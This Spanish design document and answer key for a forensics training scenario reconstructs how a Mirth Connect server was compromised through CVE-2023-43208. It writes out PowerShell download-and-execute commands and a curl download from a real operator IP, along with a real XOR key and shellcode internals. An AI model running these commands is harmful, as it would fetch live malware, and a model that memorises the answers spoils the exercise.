---
tags:
  - DFIR/Simulacion
  - DFIR/Windows
  - DFIR/Malware
  - DFIR/ThreatIntel
estado: diseño (pendiente de aprobación)
---

# Diseño — Escenario 04: servidor de integración comprometido y loader en memoria

Este documento de trabajo contiene las respuestas, así que no se entrega a quien vaya a resolver el caso. El generador se rige por él: todo lo que aparezca en las evidencias tiene que salir de esta línea temporal, y nada que no esté aquí debería aparecer.

## Origen del caso

El escenario recrea una campaña **real**. El 16/10/2026 se accedió a un *open directory* publicado en `http://104.234.26.225:8090/`, donde el operador servía sus herramientas y, por descuido, también el log de su propio servidor de telemetría (`access.log`). Todo el malware del caso se descargó de ese directorio y se analizó en estático. La parte de Kelbrook (víctima, acceso inicial, fechas y post-explotación) es inventada, pero tiene que encajar con lo que demuestran las muestras y el log real.

### Qué es real y qué es inventado

| Real (se mantiene tal cual) | Inventado (coherente con lo real) |
| --- | --- |
| IP del operador `104.234.26.225`, puertos `8090/tcp` (HTTP: descargas y telemetría) y `8084/tcp` (stager) | Kelbrook, `int01`, sus cuentas e IPs internas |
| Formato del `access.log`, las líneas del operador y las de las otras IPs que se conserven | Que la víctima del 04/10 sea Kelbrook: su IP y su nombre de host sustituyen a los reales |
| Las líneas de la primera víctima real (04/10, 18:53–18:59 UTC), con sus marcas de tiempo, rutas y User-Agent exactos | La descarga de `client64.exe` por parte de Kelbrook: en el log real **ninguna víctima** descarga el implante |
| Hashes, metadatos PE y comportamiento de `OneDrive.exe` (`ldr_win3.exe`), `client64.exe` y el DLL embebido | El acceso inicial (CVE-2023-43208 en Mirth Connect) |
| Contenido de `run.ps1` y `run2.ps1`, **incluido su bug** (`""kernel32""` dentro de un here-string) | Toda la post-explotación (reconocimiento, persistencia, exfiltración) |
| Clave XOR de 32 bytes, shellcode de 1388 bytes, hashes ROR13, saludo `w64`, XOR `0x99` de la fase 3, kill switch `%TEMP%\log_de.log` | El nombre del bucket de OSS |
| La build de PowerShell `5.1.17763.6054` del User-Agent, que delata un Server 2019 sin parchear desde mediados de 2024 | El aviso del CERT que abre el caso |

`<MUESTRA_EXCLUIDA>`, que también estaba en el directorio, **queda fuera del escenario por decisión del autor**. No aparece en ningún artefacto, tampoco en el listado del *open directory* ni en el `access.log`.

## Premisa

Kelbrook Medical recibe los resultados de Laboratorios Ardeal (ver escenario 03) en formato HL7 a través de un motor de integración, **NextGen Mirth Connect 4.4.0**, instalado en `int01`. Ardeal empuja los mensajes por MLLP sobre TLS a un canal que escucha en `6661/tcp`, publicado en el cortafuegos solo para la IP de Ardeal. En marzo, el soporte del integrador pidió acceso a la consola de administración para una migración, y IT publicó también `8443/tcp` (API y consola de Mirth) **abierto a cualquier origen**. La regla temporal nunca se retiró. Mirth corre como servicio de Windows con la cuenta **LocalSystem**, que es la configuración por defecto del instalador.

Mirth 4.4.0 es vulnerable a **CVE-2023-43208**: RCE sin autenticación por deserialización de XStream (CVSS 9.8, en el catálogo KEV de CISA desde el 20/05/2024). El parche, 4.4.1, salió en octubre de 2023 y nunca se aplicó. `int01` tampoco recibe actualizaciones de Windows desde julio de 2024, cuando se rompió su enlace con WSUS tras un cambio de VLAN. Nadie lo revisó, porque "el Mirth no se toca".

El domingo 04/10, a las 18:51 UTC, el operador levanta su servidor de descargas y telemetría en `104.234.26.225:8090`. Dos minutos después, Kelbrook es **su primera víctima**: explota el fallo desde el mismo VPS y obtiene ejecución como `NT AUTHORITY\SYSTEM`. Lo que sigue es exactamente la secuencia del log real:
- lanza `run.ps1`, que falla en silencio por un bug suyo;
- prueba a mano la salida a Internet y vuelve a lanzar `run.ps1`, con el mismo resultado;
- prueba `run2.ps1`, su versión con telemetría, y descubre que el fallo está en `Add-Type`;
- seis segundos después cambia al loader compilado, `OneDrive.exe`, que sí funciona.

Desde ese día, el operador ya no usa los scripts con nadie más: el resto de ejecuciones del log son de sandboxes y analistas.

Con la fase 3 en memoria, el operador obtiene una shell interactiva, reconoce el equipo y el dominio, deja persistencia instalando el implante (`client64.exe`) como servicio y se lleva la base de datos de mensajes de Mirth, que contiene resultados de analíticas de pacientes, a un bucket de Alibaba Cloud OSS.

Nadie lo ve. Quince días después, el CERT avisa a Kelbrook de que su IP pública aparece en el `access.log` de un *open directory* de malware.

## Activos

| Activo | IP | Rol |
| --- | --- | --- |
| `int01.kelbrook.internal` | `10.20.30.30` | Motor de integración HL7. Windows Server 2019 Standard, build **17763.6054** (último parche acumulativo instalado en julio de 2024), unido al dominio `KELBROOK`, con Sysmon. **Víctima** |
| `ids01` | `10.20.30.250` | Suricata en un puerto espejo de la DMZ, con captura de la sesión al disparar una alerta (`pcap-log` condicional). Las alertas van a un buzón que nadie lee |
| `dc01` | `10.20.30.3` | Controlador de dominio y DNS |
| `dns01` | `10.20.30.2` | Resolvedor interno; `dc01` le reenvía |
| `fw01` | `10.20.30.1` | Cortafuegos y NAT. Publica `192.0.2.25:6661` → `int01:6661` (solo desde Ardeal) y `192.0.2.25:8443` → `int01:8443` (desde cualquier origen, regla `TMP-soporte-mirth` de marzo) |
| IP pública de Kelbrook | `192.0.2.25` | NAT de salida de la DMZ e IP publicada de `int01`. Es la que aparece en el `access.log` del operador. *(El builder debe comprobar que no choca con ninguna IP de los escenarios 01–03.)* |
| VPS del operador | `104.234.26.225` | **Real.** Origen de la explotación, servidor de descargas y telemetría (`8090`) y stager (`8084`) |
| Bucket de OSS | — | `<bucket>.oss-cn-hongkong.aliyuncs.com`, dominio real de Alibaba Cloud OSS. El nombre del bucket es inventado (lo elige el builder, de forma que sea improbable que exista). Es a la vez el **C2 del implante persistente** (buzón: lee tareas y deja resultados) y el destino de la exfiltración. Resuelve a IPs inventadas de `203.0.113.0/24` |
| Laboratorios Ardeal | `198.51.100.140` | Cliente legítimo que envía HL7 por MLLP/TLS a `6661` en horario laboral. Es el ruido de fondo de las conexiones entrantes |
| CERT | `203.0.113.77` | Analista que copia el *open directory* el 16/10. Sustituye en el `access.log` a la IP real de quien lo copió |

La build es deliberada. El User-Agent `WindowsPowerShell/5.1.17763.6054` es el que el log real registra para la primera víctima. En Server 2019 la revisión de PowerShell sube con cada parche acumulativo, así que un `.6054` en octubre de 2026 delata un equipo que lleva más de dos años sin parchear. *(El builder debe comprobar a qué acumulativo corresponde exactamente `.6054`; se cree que es el de julio de 2024.)* `Solucion.md` debe explicar esta relación entre la build del sistema y la versión de PowerShell.

Cuentas:

| Cuenta | Notas |
| --- | --- |
| `NT AUTHORITY\SYSTEM` | Cuenta del servicio `Mirth Connect Service`. Toda la actividad del atacante corre con ella. En PowerShell, `$env:USERNAME` vale `INT01$` |
| `KELBROOK\adm.jtorres` | Técnico de IT (el mismo del 03). Entra por RDP los martes a revisar los canales de Mirth. Es ruido legítimo |

Configuración relevante de `int01`:

- **Sysmon 15.15**, con la misma configuración (basada en la de Olaf Hartong) que el 03. Registra los eventos 1, 3, 5, 7 (solo DLLs no firmadas o cargadas desde `Temp`/`ProgramData`), 11, 13, 22, 26 y 29.
- **Auditoría por GPO**: 4688 con línea de comandos y 4624/4634/4672. **7045** (servicio instalado) en System.
- **PowerShell**: *Script Block Logging* (4104) activado por GPO, igual que en los puestos.
- **Defender antivirus** activo. Sus firmas sí se actualizan (llegan por Internet, no por WSUS). **No detecta nada**:
  - las muestras eran nuevas en esas fechas;
  - AMSI recibe un script cuyo shellcode va cifrado con XOR, y el C# de `Add-Type` no llega a compilar;
  - el loader es de compilación propia y la fase 3 nunca toca disco.

  Además, el instalador del integrador añadió una exclusión de Defender para `C:\Program Files\Mirth Connect\`, que se ve en el registro de `SOFTWARE`. No afecta a lo que pasa fuera de esa carpeta, pero es un hallazgo de configuración. `Solucion.md` debe aclarar que hoy esas muestras sí estarían detectadas.
- **Prefetch desactivado**, que es lo normal en Windows Server. Es una trampa deliberada: quien lo busque no lo encontrará y tendrá que tirar de Amcache y Sysmon.
- **Sin EDR ni SOC 24/7.**
- **Zona horaria `Romance Standard Time`** (CEST, UTC+2). Los EVTX y el registro guardan UTC. El `access.log` del operador también va en UTC y sin zona; la solución debe señalarlo.

## La víctima real que pasa a ser Kelbrook

Estas son las líneas reales de la primera víctima del log (host `<HOST_REAL>`, cuenta `<HOST_REAL>$`). En el escenario **son de Kelbrook**:
- se conservan las marcas de tiempo, las rutas y los User-Agent exactos, al microsegundo;
- la IP real pasa a ser `192.0.2.25`;
- el nombre `<HOST_REAL>` pasa a ser `INT01`;
- los valores de `alloc-` y `thread-` se conservan.

La IP real de esa víctima no aparece en ningún artefacto.

| Hora UTC (04/10) | Petición al `:8090` | User-Agent | Qué es |
| --- | --- | --- | --- |
| 18:53:40.126109 | `/run.ps1` | `-` (vacío) | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| 18:53:40.587799 | `/ping?h=PS-INT01-INT01$` | `Mozilla/5.0` | Baliza de `run.ps1`. Después falla en silencio |
| 18:57:43.737778 | `/ping?h=INT01` | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.6054` | Prueba manual con `Invoke-WebRequest` |
| 18:57:55.972311 | `/run.ps1` | `-` | Segundo intento |
| 18:57:56.423894 | `/ping?h=PS-INT01-INT01$` | `Mozilla/5.0` | Vuelve a fallar en silencio |
| 18:59:18.886072 | `/run2.ps1` | `-` | Versión con telemetría |
| 18:59:19.344628 | `/ping?m=start-lang-FullLanguage` | `-` | |
| 18:59:19.829725 | `/ping?m=addtype-err-InvalidOperationException` | `-` | El operador ve el fallo |
| 18:59:24.740456 | `/OneDrive.exe` | `-` | `(New-Object Net.WebClient).DownloadFile(...)` y ejecución en el mismo comando. Con `Invoke-WebRequest` el UA no sería `-` |
| 18:59:25.291566 | `/ping?m=exe-start` | `-` | |
| 18:59:25.727183 | `/ping?m=dec-ok-1388` | `-` | |
| 18:59:26.153764 | `/ping?m=alloc-28377088` | `-` | `0x1B10000`, dirección de `VirtualAlloc` |
| 18:59:26.577604 | `/ping?m=thread-1284` | `-` | Nunca llegan `after-wait` ni `alive`: el hilo de la fase 3 sigue vivo |

### El bug de `run.ps1` y `run2.ps1`

Los dos scripts declaran las P/Invoke dentro de un here-string `@" ... "@` y escriben `[DllImport(""kernel32"")]`. Dentro de un here-string las comillas son literales, así que el compilador recibe `""kernel32""` y falla con errores de sintaxis (`CS1003`/`CS1026`). En Windows PowerShell 5.1, `Add-Type` lo eleva como `Cannot add type. Compilation errors occurred.` con `FullyQualifiedErrorId` `COMPILER_ERRORS` y una `InvalidOperationException`, que es exactamente lo que `run2.ps1` manda al C2.

Se ha comprobado en PowerShell 7 con un fragmento inocuo: la cadena llega con las comillas dobles y la compilación falla (`error CS1003: Syntax error, ',' expected`). La forma exacta en 5.1 (CodeDom con `csc.exe`) la debe reproducir el builder en los eventos.

Consecuencias que deben verse en las evidencias:
- `run.ps1` lleva `$ErrorActionPreference='SilentlyContinue'`, así que el error se pierde. La baliza `h=` está en la línea 2, antes de `Add-Type`, y por eso llega. Después, el uso de `[N]` falla también en silencio y el script termina. Como `run.ps1` no tiene bucle final, su `powershell.exe` muere enseguida y deja su Sysmon 5. Por eso el operador lo relanza.
- `run2.ps1` captura el error con `try/catch` y lo envía al C2. No hay error sin capturar, así que **no hay 4100**.
- Cada intento invoca **solo `csc.exe`** como hijo de `powershell.exe`, con ficheros temporales `.0.cs`, `.cmdline`, `.out` y `.err` en `C:\Windows\Temp\` (el `%TEMP%` de SYSTEM), que se crean y se borran. Como la compilación falla por sintaxis, `csc.exe` no llega a lanzar `cvtres.exe` ni se crea ninguna `.dll`. Queda en Sysmon 1, 11 y 26 y en 4688. *(El builder debe comprobar el patrón de ficheros temporales de CodeDom en Windows PowerShell 5.1.)*
- Los 4104 recogen el texto completo de los dos scripts.

## Muestras: qué se entrega

**No se entrega ningún binario del atacante.** De `OneDrive.exe`, `client64.exe` y el DLL solo quedan sus rastros: hashes reales en Sysmon y Amcache, metadatos PE, rutas, red y el listado del *open directory*.

| Muestra | SHA-256 (real) | MD5 (real) | Notas |
| --- | --- | --- | --- |
| `OneDrive.exe` | `ad07d54b62359749b7a32c265e19e5f36cd4962cf957ea6c0fb07ceddb702230` | `215336e9270941186ac2bca89425e49b` | SHA-1 `9a199096b7ed2f23166296e2fde5f8dcdf8dee51`. .NET, 9,5 KB, `OriginalFileName` `ldr_win3.exe`, empresa y descripción vacías, timestamp PE a cero, GUID de módulo `{A2D35BC2-6440-4614-8FE0-C67613A1B186}` |
| `client64.exe` | `1b6ffac83b04b5772b0b733020f2d66b2b2b9f1a462b4bb179342282a2dbca0f` | `1e801255fe8d2ac238f59e89cf440b81` | Go + cgo (MinGW-w64 GCC 7.3.0), garble, 4,5 MB, sin versión, GUI, única exportación `_cgo_dummy_export`. El builder debe calcular su SHA-1 a partir del fichero original para Amcache |
| DLL embebido en `client64.exe` | `23ba8ede69a54a343e6ec559b507d383e3c8941905e1f56b27864a54c5a59578` | `bf2f84fa4d0244e056fd18c719ddfccb` | 8 173 568 bytes, gzip en el offset `0x98b80` de `client64.exe`. Solo aparece en la ficha de inteligencia, no en el host |
| `winpty-agent.exe` / `winpty.dll` | `9add1a61…0642` / `936f611c…cd75` | — | Componentes legítimos de winpty, embebidos en el DLL. Hashes completos en el análisis original |
| `run.ps1` | `d5322f15c1a7c258e1eeedabc0d7921b7b78f38223db44c3b37c73322c0d6139` | `5866e42b2dfba75dcd2d288844f8b5da` | Hash del fichero publicado en el *open directory* |
| `run2.ps1` | `7f6ce972759a0a7b59f7b03936ab56d36ce8d49c33e03f011e09c2410c63cd78` | `790b50b31042805f59b81812c24cacae` | Ídem |

### El shellcode, inutilizado

El texto de los scripts que aparece en los 4104 es el real, con una sola diferencia: el blob base64 es el **shellcode real con una modificación mínima**.

- Se descifra con la misma clave XOR de 32 bytes (`9C9066C118BC1C5BEC80CECD029248DCE0626814CF4D89FBD86AB1354AAEE54A`) y sigue midiendo **1388 bytes**, de modo que `dec-ok-1388` cuadra.
- Se sustituye la instrucción `mov rax, gs:[0x60]` del resolvedor de APIs (offset `0x475`, 9 bytes) por `int3` (`0xCC`). Sin acceso al PEB no se puede resolver ninguna API, y el código se para nada más empezar.
- Todo lo demás queda intacto para que se pueda analizar como en el caso real: el algoritmo ROR13, los 13 hashes, las *stack strings* (`104.`/`234.`/`26.2`/`25`), el puerto `0x1f94`, el saludo `w64`, el bucle XOR `0x99`, el kill switch y el bug del `Sleep` del reintento (`call [rip+0xc69]`).
- `Solucion.md` debe explicar el parche y por qué se aplicó.

En consecuencia, el SHA-256 del texto de los 4104 no coincide con el de los ficheros del *open directory*. Es coherente: los scripts se ejecutan con `DownloadString | IEX` y nunca tocan el disco de `int01`, así que en el host no hay ningún hash con el que compararlos.

## Línea temporal

Horas en **UTC**, con la hora local entre paréntesis cuando ayuda. El día del ataque es el **domingo 04/10/2026**. `T0` = 18:53:40.126109 (20:53 hora local), la primera línea real de la víctima.

### Días anteriores (ruido de fondo, 01/09 → 04/10)

| Evento | Dónde se ve |
| --- | --- |
| **Ningún** Windows Update. Sí hay un reinicio el 15/09, por una ventana de mantenimiento del host de virtualización | System (1074, 6006, 6005, 6013) |
| Ardeal empuja HL7 por MLLP/TLS a `6661` en días laborables, 07:00–18:00 UTC, desde `198.51.100.140` | `fw01`, `mirth.log` |
| `adm.jtorres` entra por RDP los martes hacia las 08:15 UTC y abre el Administrator de Mirth | Security 4624 tipo 10, 4672, Sysmon 1 |
| Escaneo de Internet contra `8443` (TLS, rutas típicas) | `fw01` |
| Tarea de copia de seguridad nocturna de `appdata\` de Mirth | Sysmon 1, Microsoft-Windows-TaskScheduler (si se incluye) |

### Día del ataque (domingo 04/10)

| Hora UTC | Evento | Dónde se ve |
| --- | --- | --- |
| 18:51:10 / 18:51:32 | El operador prueba su servidor (`selftest` desde `127.0.0.1`, `pubtest` desde `104.234.26.225`, ambos con `curl/8.5.0`). Líneas reales | `access.log` |
| 18:52:05 | Huella de la versión: `GET /api/server/version` con `X-Requested-With: OpenAPI`, desde `104.234.26.225` | `fw01`, `mirth.log` |
| 18:52:48 | **Explotación de CVE-2023-43208**: petición a la API de Mirth con carga XStream. El primer comando es `cmd.exe /c whoami` *(el builder debe ajustar la ruta y la forma de la petición al writeup de Horizon3.ai)* | `fw01`, `mirth.log` (traza de la excepción de deserialización), Sysmon 1 / 4688 con padre el proceso de Mirth |
| T0 = 18:53:40.126 | `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://104.234.26.225:8090/run.ps1')"` | Sysmon 1, 4104, Sysmon 3, `fw01`, `access.log` |
| 18:53:40.588 | Baliza `ping?h=PS-INT01-INT01$`. `Add-Type` lanza `csc.exe`, que falla. El script termina en silencio | Sysmon 1 (`csc.exe`), Sysmon 11/26 en `C:\Windows\Temp`, 4104, Sysmon 5 de `powershell.exe`, `access.log` |
| 18:57:43.738 | `powershell -c "iwr http://104.234.26.225:8090/ping?h=INT01 -UseBasicParsing"` | Sysmon 1/3, 4104, `access.log` (UA de PowerShell) |
| 18:57:55.972 | Segundo `run.ps1`, el mismo fallo | Ídem |
| 18:59:18.886 | `run2.ps1`: `start-lang-FullLanguage` y `addtype-err-InvalidOperationException` | 4104 (texto completo), `access.log`. Sin 4100 |
| 18:59:24.740 | `powershell -c "(New-Object Net.WebClient).DownloadFile('http://104.234.26.225:8090/OneDrive.exe','C:\ProgramData\Microsoft\OneDrive\OneDrive.exe'); & 'C:\ProgramData\Microsoft\OneDrive\OneDrive.exe'"` | Sysmon 1, 11, 29, 3, Amcache, `access.log` |
| 18:59:25.29 → 18:59:26.58 | `OneDrive.exe` (`ldr_win3.exe`): `exe-start`, `dec-ok-1388`, `alloc-28377088`, `thread-1284`. Carga el CLR | Sysmon 1 (hashes y `OriginalFileName` reales), Sysmon 7 (`clr.dll`, `mscoree.dll`), Sysmon 3 ×4 a `:8090` |
| 18:59:26.70 | Conexión TCP de `OneDrive.exe` a `104.234.26.225:8084`. Saludo de 40 bytes (`w64   ` + `1f 94` + fragmentos de la IP) y descarga de la fase 3 cifrada con XOR `0x99` | Sysmon 3, `fw01` (bytes), PCAP del IDS (alerta: TCP saliente a puerto no estándar con *payload* de alta entropía) |
| 19:01:30 | La fase 3 (el implante, en memoria dentro de `OneDrive.exe`) extrae `winpty.dll` y `winpty-agent.exe` a un directorio temporal y abre una shell interactiva | Sysmon 11, 29 y 1 (`winpty-agent.exe` hijo de `OneDrive.exe`; `cmd.exe` hijo de `winpty-agent.exe`) |
| 19:02 → 19:15 | Reconocimiento: `whoami /all`, `hostname`, `ipconfig /all`, `systeminfo`, `quser`, `tasklist /v`, `netstat -ano`, `net group "Domain Admins" /domain`, `nltest /dclist:kelbrook`, `dir "C:\Program Files\Mirth Connect\appdata"` | Sysmon 1, 4688 |
| 19:18:30 | Descarga del implante: `curl.exe -s -o C:\ProgramData\Microsoft\OneDrive\Sync\OneSyncHost.exe http://104.234.26.225:8090/client64.exe` **(línea inventada, ver arriba)** | Sysmon 1, 3, 11, 29, `access.log` (UA `curl/7.55.1`, el `curl` de Server 2019) |
| 19:19:05 | `OneSyncHost.exe install`: el implante se instala como servicio `OneSyncHost` ("OneDrive Sync Host"), automático, como LocalSystem, con acciones de recuperación (reiniciar) | System 7045, Security 4697 si aplica, SYSTEM hive (`Services\OneSyncHost`, `FailureActions`), Sysmon 13 |
| 19:19:20 | Arranca el servicio. `OneSyncHost.exe` consulta su buzón en OSS por HTTPS: cada 60 s durante la primera hora y después cada 4 h, con ±10 % de variación | Sysmon 1 (padre `services.exe`), Sysmon 22 (`<bucket>.oss-cn-hongkong.aliyuncs.com`), Sysmon 3, `fw01` |
| 19:27 → 19:33 | Recolección, desde la shell de `OneDrive.exe`: `tar.exe -czf C:\Windows\Temp\mc.tgz "C:\Program Files\Mirth Connect\appdata\mirthdb"` | Sysmon 1 (`tar.exe` hijo de `cmd.exe`, hijo de `winpty-agent.exe`), Sysmon 11 |
| 19:35 → 19:40 | **Exfiltración**: el operador deja una tarea en el buzón y, en la siguiente consulta, **`OneSyncHost.exe` sube `mc.tgz` al bucket** con el SDK de OSS que lleva embebido. No hay `curl` ni línea de comandos que lo delate | Sysmon 3 y 22 de `OneSyncHost.exe`, `fw01` (una sesión con bytes salientes ≈ tamaño del `.tgz`). Se resuelve cruzando DNS, proceso y volumen |
| 19:42 | `del C:\Windows\Temp\mc.tgz`, desde la shell de `OneDrive.exe` | Sysmon 26 |
| 19:43 | El operador cierra la shell. `OneDrive.exe` sigue vivo (el bucle `Sleep` de una hora del loader) y el servicio `OneSyncHost` queda instalado | Sysmon 5 de `winpty-agent.exe`/`cmd.exe`; no hay 5 de `OneDrive.exe` |

### Días posteriores (05/10 → 19/10)

| Fecha | Evento | Dónde se ve |
| --- | --- | --- |
| Cada 4 h (±10 %) | `OneSyncHost.exe` consulta su buzón en OSS. Desde el 04/10 no hay nuevas tareas | Sysmon 3/22, `fw01` |
| 05/10 en adelante | Crawlers, sandboxes y analistas empiezan a aparecer en el `access.log` (líneas reales) | `access.log` |
| 06/10 y 13/10, 08:15 | `adm.jtorres` entra por RDP como cada martes | Security 4624 tipo 10 |
| 13/10 08:31 | Un canal de Mirth se queda colgado y `adm.jtorres` reinicia `int01` (`shutdown /r`, motivo "Aplicación: mantenimiento"). `OneDrive.exe` muere (no tenía persistencia) y `OneSyncHost` arranca solo. Por eso, cuando se investiga, ya no queda nada en memoria | System 1074 con su usuario, 6006/6005, Sysmon 1 de `OneSyncHost.exe` con padre `services.exe` |
| 16/10 08:36–08:37 | El CERT (`203.0.113.77`) copia el *open directory*: descarga `OneDrive.exe`, `bootstrap_enc.txt` y `access.log` | Las últimas líneas del `access.log` |
| Lunes 19/10 07:10 (09:10 local) | Aviso del CERT por correo, tras revisar el log, atribuir las IPs con WHOIS y avisar a los afectados | `inteligencia/aviso_CERT_2026-10-19.eml` |
| 19/10 11:20 | IT recoge el triage de `int01` con KAPE y exporta los logs de `fw01` hasta ese momento | Marca de tiempo del triage, corte de los EVTX y de `fw01` |

### El `access.log` del operador

La copia que entrega el CERT es el `access.log` real con estos cambios:
- Las líneas de la primera víctima pasan a ser de Kelbrook (ver "La víctima real que pasa a ser Kelbrook").
- Se **añade** una sola línea inventada: la descarga de `client64.exe` desde `192.0.2.25` el 04/10 a las 19:18:30, con UA `curl/7.55.1`. `Solucion.md` debe decir que es inventada y que en el log real ninguna víctima descarga el implante: solo lo hacen crawlers e investigadores.
- Se **conservan** las líneas del propio operador (`selftest` y `pubtest`), el ruido de escáneres y crawlers (`/.env`, `/.git/config`, `/mcp`, `/favicon.ico`…) y una parte de las demás ejecuciones de la cadena.
- De las demás IPs que ejecutan los scripts o el loader, se conservan unas 10–12 con todas sus líneas y se elimina el resto. Deben quedar los patrones que se ven en el real:
  - balizas `ping?h=PS-<HOST>-<usuario>` con nombres de host aleatorios y usuarios genéricos (`Administrator`, `azure`, cadenas al azar). Los nombres reales se **sustituyen por otros inventados con el mismo aspecto**, porque pueden identificar a terceros, y las IPs se mantienen;
  - ráfagas de la cadena `exe-start` → `thread-` en el mismo segundo, desde IPs de nube consecutivas;
  - una ejecución con el `h=` sin evaluar (`$env:COMPUTERNAME` literal), propia de un emulador.
- El material **no llama "víctimas" a esas IPs**. La pregunta 13 pide distinguir la única ejecución con manos en el teclado (Kelbrook) del resto, con estos criterios:
  - contexto SYSTEM/servicio (`HOST$`) frente a usuarios genéricos;
  - pruebas manuales con UA de PowerShell y reintentos a ritmo humano;
  - ráfagas automáticas desde rangos de nube;
  - aparición después de que crawlers indexaran el directorio, a partir del 05/10.
- Se **eliminan** todas las líneas de `/<MUESTRA_EXCLUIDA>`.
- La IP real de quien copió el directorio (`<IP_COPIA_REAL>`, 6 líneas el 16/10) se **sustituye por la del CERT**, `203.0.113.77`.
- Se recorta en la hora en que el CERT lo copió: 16/10 08:37 UTC, igual que en el real.

## Evidencias que se entregan

```
04_Windows_Server_Loader/
├── Escenario.md
├── Solucion.md
├── generar_escenario.py
├── triage/
│   └── INT01_triage.zip
├── red/
│   ├── fw01_2026-09-01_2026-10-19.log      (log de conexiones del cortafuegos para int01)
│   └── ids01_alerta_2026-10-04_8084.pcap   (sesión guardada por Suricata al disparar una alerta)
└── inteligencia/
    ├── aviso_CERT_2026-10-19.eml
    └── opendir_104.234.26.225_8090/
        ├── index.html                      (listado del directorio tal y como se vio)
        ├── access.log                      (copia saneada, ver arriba)
        └── ficha_muestras.md               (hashes reales de las muestras, sin binarios)
```

Contenido del ZIP de triage, con la estructura de salida de KAPE del 03. Con las prisas, IT no lanza `KapeTriage` sino un target propio: `EventLogs`, `RegistryHives`, `Amcache`, `Prefetch` y un target a medida para `Mirth Connect`. **No recoge `$MFT`, `$UsnJrnl` ni SRUM, ni captura la memoria.** El `ConsoleLog` lo deja ver, y la pregunta 16 pide señalar esas carencias. La memoria tampoco habría servido: `OneDrive.exe` murió en el reinicio del 13/10.

```
INT01/
├── <timestamp UTC>_ConsoleLog.txt
├── <timestamp UTC>_CopyLog.csv
└── C/
    ├── Windows/System32/winevt/Logs/
    │   ├── Security.evtx
    │   ├── System.evtx
    │   ├── Application.evtx
    │   ├── Microsoft-Windows-Sysmon%4Operational.evtx
    │   ├── Microsoft-Windows-PowerShell%4Operational.evtx
    │   ├── Windows PowerShell.evtx
    │   └── Microsoft-Windows-Windows Defender%4Operational.evtx
    ├── Windows/System32/config/   SYSTEM  SOFTWARE  (+ .LOG1/.LOG2)
    ├── Windows/appcompat/Programs/Amcache.hve
    ├── Windows/Prefetch/            (vacío: Prefetch desactivado en Server)
    └── Program Files/Mirth Connect/
        ├── logs/mirth.log (+ rotados)
        └── conf/mirth.properties
```

### Detalle por fuente

- **`fw01`**: una línea por conexión que toque a `int01`, con los campos origen, destino, puerto, acción, bytes enviados y recibidos, duración y regla NAT. Debe permitir ver el MLLP legítimo de Ardeal a `6661`, la explotación entrante a `8443`, las salidas a `8090` y `8084`, el volumen de la fase 3 y el de la exfiltración, y las consultas de `OneSyncHost.exe` al bucket (cada 60 s la primera hora y luego cada 4 h).
- **PCAP del IDS**: solo la sesión `int01 → 104.234.26.225:8084` del 04/10. Lleva el saludo de 40 bytes en claro y los primeros KB de la fase 3. La fase 3 se genera como un buffer ficticio cifrado con XOR `0x99`; al descifrarlo, debe empezar por una cabecera reconocible, pero **no** ser código real. Una alerta de Suricata en `ids01` por "TCP saliente a puerto no estándar con *payload* de alta entropía" justifica que exista la captura.
- **`mirth.log`**: arranques del servicio, tráfico normal de canales y, el 04/10, las peticiones del atacante con la traza de la excepción de XStream. El builder debe ajustar la ruta de la API y la forma de la traza a la descripción técnica pública de CVE-2023-43208 (Horizon3.ai) y comprobar que el proceso padre de los hijos de Mirth en Windows es el correcto (por ejemplo, `mcservice.exe` frente a `java.exe`).
- **Aviso del CERT**: correo breve en español, con la IP pública de Kelbrook, la URL del *open directory*, la hora en que se copió y una petición de investigar. No da más pistas.
- **`index.html`**: listado al estilo del `http.server` de Python con `OneDrive.exe`, `client64.exe`, `run.ps1`, `run2.ps1`, `bootstrap_enc.txt`, `server.py` y `access.log`, con tamaños y fechas coherentes. Sin `<MUESTRA_EXCLUIDA>`. `server.py` y `bootstrap_enc.txt` aparecen solo por nombre, porque no se analizaron.

## Mapa ATT&CK

| Fase | Técnica | Evidencia |
| --- | --- | --- |
| Reconocimiento | T1595.002 Active Scanning: Vulnerability Scanning | `GET /api/server/version`, `fw01` |
| Acceso inicial | T1190 Exploit Public-Facing Application | CVE-2023-43208, `mirth.log`, hijos del proceso de Mirth |
| Ejecución | T1059.001 PowerShell | 4104, Sysmon 1 |
| Ejecución | T1059.003 Windows Command Shell | `cmd.exe` hijo de Mirth y de `winpty-agent.exe` |
| Ejecución | T1106 Native API | `VirtualAlloc`/`CreateThread` en los scripts y en `ldr_win3.exe` |
| Evasión | T1036.005 Match Legitimate Resource Name or Location | `C:\ProgramData\Microsoft\OneDrive\OneDrive.exe`, servicio `OneSyncHost` |
| Evasión | T1027.002 Software Packing / T1027.013 Encrypted/Encoded File | Blob XOR, gzip embebido, garble |
| Evasión | T1620 Reflective Code Loading | La fase 3 nunca toca disco |
| Evasión | T1070.004 File Deletion | `del mc.tgz`, Sysmon 26 |
| Transferencia | T1105 Ingress Tool Transfer | `run*.ps1`, `OneDrive.exe`, `client64.exe` |
| Persistencia | T1543.003 Windows Service | 7045, `Services\OneSyncHost` |
| Descubrimiento | T1033, T1082, T1016, T1049, T1057, T1069.002, T1018, T1083 | `whoami`, `systeminfo`, `ipconfig`, `netstat`, `tasklist`, `net group`, `nltest`, `dir` |
| Recolección | T1005 Data from Local System, T1560.001 Archive via Utility | `tar.exe` sobre `mirthdb` |
| C2 | T1071.001 Web Protocols, T1095 Non-Application Layer Protocol | `:8090` HTTP, `:8084` TCP en bruto |
| Exfiltración | T1567.002 Exfiltration to Cloud Storage | Alibaba Cloud OSS |

## Preguntas candidatas para `Escenario.md`

La dificultad se ajustará en una revisión en frío. Se proponen preguntas sobre estos puntos, en este orden:

1. ¿Qué IP externa explotó `int01`, por qué servicio y qué vulnerabilidad? ¿A qué hora (UTC)?
2. ¿Con qué cuenta se ejecutaba el código del atacante, y qué valor de `$env:USERNAME` delata eso en el `access.log`?
3. ¿Cuántas veces ejecutó el atacante `run.ps1` y por qué no funcionó? (Hay que llegar al bug del here-string.)
4. ¿Qué excepción concreta reportó `run2.ps1` al C2 y qué hizo el operador después? ¿Cuántos segundos pasaron?
5. ¿Qué nombre interno (`OriginalFileName`) y qué SHA-256 tiene el `OneDrive.exe` que se ejecutó?
6. Descifra el blob de los scripts. ¿Qué clave y qué algoritmo usa? ¿Cuánto mide el resultado?
7. ¿A qué IP y puerto conecta el shellcode, y qué saludo envía? ¿Cómo resuelve las APIs?
8. ¿Con qué clave se cifra la fase 3?
